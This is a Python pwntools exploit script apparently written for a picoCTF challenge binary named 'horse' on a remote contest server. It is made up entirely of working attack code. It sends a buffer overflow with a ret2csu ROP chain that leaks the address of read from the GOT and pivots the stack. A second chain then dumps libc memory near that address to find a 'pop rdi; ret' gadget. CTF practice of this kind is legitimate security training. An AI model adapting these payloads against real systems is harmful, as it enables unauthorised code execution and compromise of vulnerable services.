from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602500
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x8000)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(heap_stack) + p64(0) * 4 + p64(leave_ret) 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        print(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except:
        exit()

leaked_read = leak_read()

center_offset = -0xea5be
start_offset = center_offset - 0x200 # Smaller range
end_offset = center_offset + 0x200

addresses = range(leaked_read + start_offset, leaked_read + end_offset)

payload2 = b'J' * 8 
count = 0
for addr in addresses:
    payload2 += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(addr) + p64(2)
    payload2 += p64(csu_call)
    payload2 += b'J' * 8 
    count += 1
    if len(payload2) > 0x6000: 
        break

# Clean exit
payload2 += p64(0) * 6 # pops
payload2 += p64(0xdeadbeef) # ret

print(f"Scanning {count} addresses...")
r.sendline(payload2)

try:
    data = r.recvn(count * 2)
    
    memory = {}
    for k in range(count):
        addr = addresses[k]
        b1 = data[2*k]
        b2 = data[2*k+1]
        memory[addr] = b1
        memory[addr+1] = b2

    found = False
    for addr in sorted(memory.keys()):
        if memory.get(addr) == 0x5f and memory.get(addr+1) == 0xc3:
            print(f"FOUND POP RDI: {hex(addr)}")
            found = True
            break
    if not found:
        print("Not found")

except Exception as e:
    print(f"Error: {e}")

r.close()
